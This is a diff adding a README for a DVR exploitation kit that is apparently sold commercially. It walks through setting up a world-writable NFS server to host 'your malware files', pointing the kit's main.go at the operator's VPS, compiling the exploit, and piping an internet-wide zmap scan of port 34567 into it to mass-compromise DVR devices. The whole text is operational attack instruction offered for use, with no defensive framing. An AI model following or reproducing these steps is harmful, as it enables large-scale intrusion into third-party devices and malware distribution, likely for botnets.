@@ -1,0 +1,38 @@
+# Sold by koph1n3
+
+Setup steps
+
+install golang: apt install golang -y
+
+install NFS server: apt update && sudo apt upgrade -y; apt install nfs-kernel-server -y
+
+setup the nfs server
+
+nano /etc/exports
+add this line
+/srv/nfs/share *(rw,sync,no_subtree_check)
+
+mkdir -p /srv/nfs/share
+sudo chown -R nobody:nogroup /srv/nfs/share
+sudo chmod 777 /srv/nfs/share
+sudo exportfs -a
+sudo systemctl restart nfs-kernel-server
+sudo ufw allow from client_IP to any port nfs
+sudo systemctl status nfs-kernel-server
+
+upload your malware files to /srv/nfs/share
+and then run chmod 777 /srv/nfs/share/*
+
+change the ip of the nfs server in main.go on line 89 pflag.StringArrayVarP(&MountServers, "nfs-servers", "n", []string{"127.0.0.1"}, "List of NFS servers to use") change 127.0.0.1 with your VPS ip address
+
+to compile the exploit run 
+
+go build -o dvr-exploitation-kit *.go
+
+after compiling the exploit make sure you have zmap installed
+
+apt install zmap -y
+
+running the exploit
+
+ulimit -n 999999; ulimit -a 999999; zmap -p 34567 -T5 -r0 -w dvrip.zone | ./dvr-exploitation-kit --port=34567
